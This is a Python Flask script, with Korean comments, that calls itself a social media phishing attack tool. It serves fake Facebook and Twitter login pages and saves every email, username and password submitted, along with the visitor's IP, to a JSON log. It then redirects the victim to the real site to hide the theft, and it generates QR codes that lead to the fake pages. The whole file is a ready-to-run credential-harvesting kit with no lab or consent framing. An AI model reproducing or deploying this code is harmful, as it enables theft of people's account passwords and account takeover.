#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, render_template, request, jsonify, redirect, url_for
import qrcode
import json
import os
import sys
import threading
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'social_login_app_2024'

# 실제 소셜 미디어 사이트 URL
REAL_SOCIAL_URLS = {
    'facebook': 'https://www.facebook.com/',
    'twitter': 'https://twitter.com/'
}

# 로그인 시도 로그 저장
LOGIN_LOGS = []

# 기본 홈페이지 설정
DEFAULT_HOME_PAGE = 'facebook'  # 기본값, 실행 시 변경됨

def save_login_attempt(platform, credentials, success=False):
    """로그인 시도를 로그에 저장"""
    log_entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'platform': platform,
        'credentials': credentials,
        'success': success,
        'ip': request.remote_addr
    }
    LOGIN_LOGS.append(log_entry)
    
    # 로그를 파일에 저장
    with open('login_logs.json', 'w', encoding='utf-8') as f:
        json.dump(LOGIN_LOGS, f, ensure_ascii=False, indent=2)

def generate_qr_code_file(url, platform_name, save_path=None):
    """QR 코드 생성 및 파일 저장"""
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(url)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    
    if save_path is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # 현재 작업 디렉토리에 저장
        current_dir = os.getcwd()
        save_path = os.path.join(current_dir, f"{platform_name}_qr_{timestamp}.png")
    
    img.save(save_path)
    return save_path

def qr_generator_menu():
    """QR 코드 생성 메뉴"""
    print("=" * 50)
    print("🎣 피싱 공격 QR 코드 생성기")
    print("=" * 50)
    print()
    
    # 서버 주소 입력
    print("서버 주소를 입력하세요 (기본값: http://localhost:5000)")
    base_url = input("주소: ").strip()
    if not base_url:
        base_url = "http://localhost:5000"
    
    # URL 형식 확인
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'http://' + base_url
    
    if not base_url.endswith('/'):
        base_url += '/'
    
    print(f"\n기본 URL: {base_url}")
    print()
    
    # 플랫폼 선택 메뉴
    platforms = {
        '1': {'name': 'Facebook', 'url': f'{base_url}facebook', 'file': 'facebook'},
        '2': {'name': 'Twitter', 'url': f'{base_url}twitter', 'file': 'twitter'},
        '3': {'name': '전체', 'url': '', 'file': 'all'}
    }
    
    while True:
        print("QR 코드를 생성할 플랫폼을 선택하세요:")
        print("1. 👥 Facebook") 
        print("2. 🐦 Twitter")
        print("3. 🌟 전체 생성")
        print("0. QR 생성기만 종료 (웹서버는 계속 실행)")
        print("9. 전체 프로그램 종료 (웹서버도 함께 종료)")
        print()
        
        choice = input("선택 (1-3, 0, 9): ").strip()
        
        if choice == '0':
            print("QR 생성기를 종료합니다. 웹서버는 계속 실행됩니다.")
            print("웹서버 주소: http://localhost:5000")
            print("웹서버를 종료하려면 Ctrl+C를 누르세요.")
            return 'qr_only_exit'
        
        if choice == '9':
            print("전체 프로그램을 종료합니다.")
            return 'full_exit'
        
        if choice not in platforms:
            print("❌ 잘못된 선택입니다. 다시 선택해주세요.\n")
            continue
        
        print()
        
        if choice == '3':  # 전체 생성
            print("🌟 모든 플랫폼의 QR 코드를 생성합니다...")
            generated_files = []
            
            for key in ['1', '2']:
                platform = platforms[key]
                try:
                    file_path = generate_qr_code_file(platform['url'], platform['file'])
                    generated_files.append(file_path)
                    print(f"✅ {platform['name']} QR 코드 생성: {file_path}")
                except Exception as e:
                    print(f"❌ {platform['name']} QR 코드 생성 실패: {e}")
            
            print(f"\n🎉 총 {len(generated_files)}개의 QR 코드가 생성되었습니다!")
            for file in generated_files:
                print(f"   📁 {file}")
        
        else:  # 개별 생성
            platform = platforms[choice]
            print(f"� {platform['name']} QR 코드를 생성합니다...")
            
            try:
                file_path = generate_qr_code_file(platform['url'], platform['file'])
                print(f"✅ QR 코드 생성 완료: {file_path}")
                print(f"📱 URL: {platform['url']}")
                
                # 파일 열기 옵션
                open_file = input("\n생성된 QR 코드를 열어보시겠습니까? (y/n): ").strip().lower()
                if open_file in ['y', 'yes', '예']:
                    try:
                        os.startfile(file_path)  # Windows
                    except:
                        try:
                            os.system(f'open {file_path}')  # macOS
                        except:
                            try:
                                os.system(f'xdg-open {file_path}')  # Linux
                            except:
                                print("파일을 자동으로 열 수 없습니다. 수동으로 열어주세요.")
                
            except Exception as e:
                print(f"❌ QR 코드 생성 실패: {e}")
        
        print("\n" + "=" * 50 + "\n")
    
    print("QR 생성기가 종료되었습니다. 웹서버는 계속 실행 중입니다. 👋")

def start_qr_generator():
    """별도 스레드에서 QR 생성기 실행"""
    try:
        qr_generator_menu()
    except KeyboardInterrupt:
        print("\n\nQR 생성기가 중단되었습니다.")
    except Exception as e:
        print(f"\n오류가 발생했습니다: {e}")

def show_startup_menu():
    """시작 메뉴 표시"""
    print("=" * 60)
    print("🎣 소셜 미디어 피싱 공격 도구")
    print("=" * 60)
    print()
    print("기본 홈페이지를 선택하세요:")
    print("1. 👥 Facebook 로그인 페이지")
    print("2. � Twitter 로그인 페이지")
    print()
    
    while True:
        choice = input("선택 (1-2): ").strip()
        
        if choice == '1':
            return 'facebook'
        elif choice == '2':
            return 'twitter'
        else:
            print("❌ 잘못된 선택입니다. 다시 선택해주세요.")

def show_execution_menu():
    """실행 모드 선택 메뉴"""
    print("\n실행 모드를 선택하세요:")
    print("1. 🌐 웹 서버만 실행")
    print("2. 📱 QR 코드 생성기만 실행")
    print("3. 🚀 웹 서버 + QR 생성기 동시 실행")
    print("0. 종료")
    print()
    
    while True:
        choice = input("선택 (1-3, 0): ").strip()
        
        if choice == '0':
            print("프로그램을 종료합니다.")
            sys.exit(0)
        elif choice == '1':
            return 'server'
        elif choice == '2':
            return 'qr'
        elif choice == '3':
            return 'both'
        else:
            print("❌ 잘못된 선택입니다. 다시 선택해주세요.")

@app.route('/')
def index():
    """메인 페이지 - 선택된 플랫폼으로 리다이렉트"""
    if DEFAULT_HOME_PAGE == 'facebook':
        return redirect(url_for('facebook_login'))
    elif DEFAULT_HOME_PAGE == 'twitter':
        return redirect(url_for('twitter_login'))
    else:
        return redirect(url_for('facebook_login'))  # 기본값

@app.route('/facebook')
def facebook_login():
    """Facebook 로그인 페이지"""
    return render_template('facebook.html')

@app.route('/twitter')
def twitter_login():
    """Twitter 로그인 페이지"""
    return render_template('twitter.html')

@app.route('/login/<platform>', methods=['POST'])
def handle_login(platform):
    """로그인 처리 - 모든 입력을 허용하고 실제 사이트로 리다이렉트"""
    if platform == 'facebook':
        email = request.form.get('email')
        password = request.form.get('password')
        credentials = {'email': email, 'password': password}
        
        # 입력이 있으면 무조건 성공으로 처리
        if email and password:
            save_login_attempt(platform, credentials, success=True)
            return jsonify({
                'success': True, 
                'message': '로그인 성공! Facebook으로 이동합니다...',
                'redirect_url': REAL_SOCIAL_URLS['facebook']
            })
        else:
            save_login_attempt(platform, credentials, success=False)
            return jsonify({'success': False, 'message': '이메일과 비밀번호를 입력해주세요.'})
    
    elif platform == 'twitter':
        username = request.form.get('username')
        password = request.form.get('password')
        credentials = {'username': username, 'password': password}
        
        # 입력이 있으면 무조건 성공으로 처리
        if username and password:
            save_login_attempt(platform, credentials, success=True)
            return jsonify({
                'success': True, 
                'message': '로그인 성공! Twitter로 이동합니다...',
                'redirect_url': REAL_SOCIAL_URLS['twitter']
            })
        else:
            save_login_attempt(platform, credentials, success=False)
            return jsonify({'success': False, 'message': '사용자명과 비밀번호를 입력해주세요.'})
    
    return jsonify({'success': False, 'message': '지원하지 않는 플랫폼입니다.'})

def start_web_server():
    """웹 서버 시작"""
    # templates 폴더 생성
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    platform_name = "Facebook" if DEFAULT_HOME_PAGE == 'facebook' else "Twitter"
    print(f"피싱 공격 서버 시작... (기본 페이지: {platform_name})")
    print("서버 주소: http://localhost:5000")
    print("종료하려면 Ctrl+C를 누르세요")
    print()
    
    app.run(debug=False, host='0.0.0.0', port=5000, use_reloader=False)

if __name__ == '__main__':
    try:
        # 명령행 인수 확인
        if len(sys.argv) > 1:
            mode = sys.argv[1].lower()
            if mode == 'qr':
                qr_result = qr_generator_menu()
                if qr_result == 'full_exit':
                    print("프로그램을 종료합니다.")
                    sys.exit(0)
            elif mode == 'server':
                # 기본 홈페이지 선택
                DEFAULT_HOME_PAGE = show_startup_menu()
                start_web_server()
            else:
                print("사용법: python social_login_simulator.py [server|qr]")
        else:
            # 기본 홈페이지 선택
            DEFAULT_HOME_PAGE = show_startup_menu()
            
            # 실행 모드 선택
            mode = show_execution_menu()
            
            if mode == 'server':
                start_web_server()
            elif mode == 'qr':
                qr_result = qr_generator_menu()
                if qr_result == 'full_exit':
                    print("프로그램을 종료합니다.")
                    sys.exit(0)
            elif mode == 'both':
                print("\n🚀 웹 서버와 QR 생성기를 동시에 시작합니다...")
                print("웹 서버는 백그라운드에서 실행되고, QR 생성기가 활성화됩니다.")
                print()
                
                # 웹 서버를 별도 스레드에서 시작
                server_thread = threading.Thread(target=start_web_server, daemon=True)
                server_thread.start()
                
                # 잠시 대기 후 QR 생성기 시작
                import time
                time.sleep(2)
                qr_result = qr_generator_menu()
                
                # QR 생성기 결과에 따라 처리
                if qr_result == 'full_exit':
                    print("전체 프로그램을 종료합니다.")
                    sys.exit(0)
                elif qr_result == 'qr_only_exit':
                    print("QR 생성기가 종료되었습니다. 웹서버는 계속 실행됩니다.")
                    print("웹서버를 종료하려면 Ctrl+C를 누르세요.")
                    try:
                        # 웹서버가 계속 실행되도록 대기
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print("\n웹서버를 종료합니다.")
                        sys.exit(0)
                
    except KeyboardInterrupt:
        print("\n\n프로그램이 중단되었습니다.")
    except Exception as e:
        print(f"\n오류가 발생했습니다: {e}")
        input("Enter 키를 눌러 종료하세요...")